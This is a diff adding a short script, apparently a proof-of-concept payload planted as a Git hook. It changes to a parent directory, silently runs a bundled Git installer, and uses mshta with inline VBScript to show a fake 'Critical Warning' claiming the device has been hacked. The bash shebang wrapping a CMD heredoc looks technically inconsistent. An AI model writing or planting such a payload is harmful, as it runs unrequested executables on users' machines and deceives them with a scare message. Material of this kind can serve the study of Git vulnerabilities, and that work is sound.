@@ -1,0 +1,6 @@
+#!/bin/bash
+cd ../../..
+CMD <<END
+start explorer .\Git-2.45.1-64-bit.exe /VERYSILENT
+mshta vbscript:msgbox("Your device has already been hacked because your current version of Git has a very dangerous remote code execution vulnerability! "+vbCrLf+"We are now updating your Git to a later version for your own safety. "+vbCrLf+"Please do not shutdown your computer. ",16,"Critical Warning: ")(window.close)
+END
